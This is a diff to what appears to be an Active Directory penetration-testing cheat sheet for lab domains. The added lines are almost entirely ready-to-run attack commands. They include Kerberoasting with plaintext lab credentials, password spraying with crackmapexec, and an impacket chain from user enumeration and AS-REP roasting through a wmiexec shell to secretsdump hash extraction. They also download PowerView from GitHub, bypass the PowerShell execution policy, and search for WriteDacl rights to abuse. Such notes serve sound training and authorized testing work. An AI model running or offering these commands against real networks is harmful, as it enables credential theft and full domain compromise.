@@ -45,8 +45,24 @@ cme ldap <target> --get-sid
 
 kerbrute userenum --dc 192.168.10.10 -d MARVEL.local users.txt
 crackmapexec smb 192.168.10.10 -u spray.txt -p 'Password123!'
-impacket-GetUserSPNs MARVEL.local/tstark:User@123 -dc-ip 192.168.10.10 -request
+impacket-GetUserSPNs CEH.CYBERSPHERE/Emily:T3chieT1g3r2024 -dc-ip 10.100.50.200 -request
 
+[samrdump.py] --------> Extracts a list of valid usernames.
+     │
+     ▼
+[GetNPUsers.py] ------> Requests Kerberos tickets for those users (AS-REP Roasting).
+     │
+     ▼
+[wmiexec.py] ---------> Logs into a machine using admin credentials to get a shell.
+     │
+     ▼
+[secretsdump.py] ------> Pulls all password hashes/secrets out of the domain database.
+
+cme smb 10.100.50.200 -u /home/attacker/Desktop/Wordlists/Usernames.txt -p 'H3l3n@444' --continue-on-success
+# Download PowerView from a common repository - iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1
+Set-ExecutionPolicy Bypass -Scope Process -Force
+Import-Module .\PowerView.ps1
+Get-DomainObjectAcl -ResolveGUIDs | ? {($_.SecurityIdentifier -match (Convert-NameToSid Carlos)) -and ($_.ActiveDirectoryRights -match "WriteDacl")} | Select-Object ObjectDN
 
 smbclient -L //192.168.10.101
 
